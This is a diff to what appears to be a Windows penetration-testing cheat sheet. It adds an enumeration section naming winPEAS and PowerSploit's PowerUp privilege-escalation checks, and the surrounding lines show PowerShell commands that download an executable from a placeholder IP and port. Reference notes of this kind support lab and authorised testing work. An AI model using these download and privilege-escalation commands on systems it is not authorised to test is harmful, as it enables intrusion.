@@ -275,6 +275,12 @@ dir /a:h `show only hidden files`<br/>
 `powershell -c "wget http://<ip>:<port>/<file>" -outfile output.exe`<br />
 `powershell Invoke-WebRequest -Uri $ip -OutFile $filepath`
 
+## Enumeration
+
+* Running `winPEAS.exe` on the machine 
+* Running `PowerUp.ps1` (https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) , documentation https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/ `. .\PowerUp.ps1` Then `Invoke-AllChecks`
+
+
 ## List Drives
 `wmic logicaldisk get caption`
 
